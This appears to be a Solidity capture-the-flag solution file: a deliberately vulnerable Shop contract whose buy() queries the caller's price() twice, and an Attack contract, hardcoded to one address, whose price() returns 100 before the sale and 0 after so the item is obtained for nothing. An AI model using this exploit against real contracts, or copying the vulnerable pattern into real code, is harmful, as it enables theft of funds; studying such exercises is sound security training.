// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}


contract Attack{

    uint counter;
    Shop public shop = Shop(0x04F0caEb2826A2c16b65CA60a6684099259d9265);
    function attack() public payable{
        shop.buy();
    }
    function price() external view returns (uint256)
    {
        return shop.isSold() ? 0 : 100;
    }
}